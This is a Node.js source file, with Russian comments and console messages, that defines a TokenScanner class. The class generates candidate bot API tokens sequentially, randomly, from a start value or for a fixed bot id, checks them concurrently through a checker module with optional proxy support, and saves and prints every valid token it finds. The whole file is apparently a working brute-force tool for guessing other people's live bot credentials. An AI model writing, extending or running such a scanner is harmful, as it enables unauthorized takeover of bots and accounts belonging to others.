
const { BotTokenGenerator } = require('./token-generator');
const { BotTokenChecker } = require('./token-checker');
const { TokenStorage } = require('./token-storage');

class TokenScanner {
    constructor(config) {
        this.config = {
            mode: config.mode || 'sequential', // 'sequential', 'from-value', 'random'
            startToken: config.startToken || null,
            concurrentRequests: config.concurrentRequests || 3,
            outputDir: config.outputDir || './results/tokens',
            limit: config.limit || null, // null = бесконечно
            saveInterval: config.saveInterval || 50, // каждые N попыток
            ...config
        };

        this.storage = new TokenStorage(this.config.outputDir);
        this.checker = new BotTokenChecker(this.config.proxy);

        this.stats = {
            attempts: 0,
            found: 0,
            errors: 0,
            current: '',
            startTime: Date.now(),
            recentAttempts: [],
            lastFound: null
        };

        this.running = false;
        this.workers = [];
    }

    initializeGenerator() {
        const progress = this.storage.loadProgress();

        if (this.config.mode === 'fixed-botid') {
            const options = {
                fixedBotId: this.config.fixedBotId,
                secretMode: this.config.secretMode || 'sequential',
                startSecret: this.config.startSecret || null
            };
            return new BotTokenGenerator('fixed-botid', null, options);
        } else if (this.config.mode === 'random') {
            return new BotTokenGenerator('random');
        } else if (this.config.mode === 'from-value' && this.config.startToken) {
            return new BotTokenGenerator('from-value', this.config.startToken);
        } else if (progress && progress.mode !== 'random' && progress.currentToken) {
            console.log(`Продолжаем с токена: ${progress.currentToken}`);
            return new BotTokenGenerator('from-value', progress.currentToken);
        } else {
            return new BotTokenGenerator(this.config.mode, this.config.startToken);
        }
    }

    async checkToken(token) {
        try {
            this.stats.recentAttempts.push(Date.now());
            this.stats.current = token;

            this.onCheckAttempt(token);

            const result = await this.checker.checkToken(token);

            if (result.valid) {
                this.stats.found++;
                this.stats.lastFound = token;

                this.storage.addFoundToken(result);

                this.onTokenFound(result);
            } else {
                this.onInvalidToken(token, result.error);
            }

            return result.valid;

        } catch (error) {
            this.stats.errors++;
            this.onError(token, error);
            return false;
        }
    }

    async worker(generator, workerId) {
        while (this.running) {
            if (this.config.limit && this.stats.attempts >= this.config.limit) {
                break;
            }

            const token = generator.next();
            this.stats.attempts++;

            await this.checkToken(token);

            if (this.stats.attempts % this.config.saveInterval === 0) {
                this.saveProgress(generator);
            }

            if (this.stats.attempts % 5 === 0) {
                this.onUpdate();
            }
        }
    }

    saveProgress(generator) {
        const state = generator.getState();
        this.storage.updateProgress(
            this.stats.attempts,
            this.stats.found,
            state.currentToken || 'random',
            state.mode
        );
    }

    async start() {
        this.running = true;
        this.stats.startTime = Date.now();

        const generator = this.initializeGenerator();

        this.onStart();

        this.workers = [];
        for (let i = 0; i < this.config.concurrentRequests; i++) {
            this.workers.push(this.worker(generator, i));
        }

        await Promise.all(this.workers);

        this.onFinish();
    }

    stop() {
        this.running = false;
    }

    calculateSpeed() {
        const now = Date.now();
        const timeWindow = 30000; // 30 секунд

        this.stats.recentAttempts = this.stats.recentAttempts.filter(
            timestamp => now - timestamp < timeWindow
        );

        if (this.stats.recentAttempts.length === 0) return 0;

        const oldestTimestamp = this.stats.recentAttempts[0];
        const timeSpan = (now - oldestTimestamp) / 1000;

        if (timeSpan === 0) return 0;

        return (this.stats.recentAttempts.length / timeSpan).toFixed(1);
    }

    getStats() {
        return {
            ...this.stats,
            speed: this.calculateSpeed(),
            uptime: Date.now() - this.stats.startTime
        };
    }


    onStart() {
        console.log('Сканирование токенов запущено...');
    }

    onCheckAttempt(token) {
    }

    onInvalidToken(token, error) {
    }

    onTokenFound(tokenInfo) {
        console.log(`✓ НАЙДЕН ТОКЕН: ${tokenInfo.token}`);
    }

    onError(token, error) {
    }

    onUpdate() {
        const stats = this.getStats();
        console.log(`Попыток: ${stats.attempts} | Найдено: ${stats.found} | Скорость: ${stats.speed} req/s | Текущий: ${stats.current}`);
    }

    onFinish() {
        console.log('Сканирование завершено!');
        console.log(`Всего попыток: ${this.stats.attempts}`);
        console.log(`Найдено токенов: ${this.stats.found}`);
        console.log(`Ошибок: ${this.stats.errors}`);
    }
}

module.exports = { TokenScanner };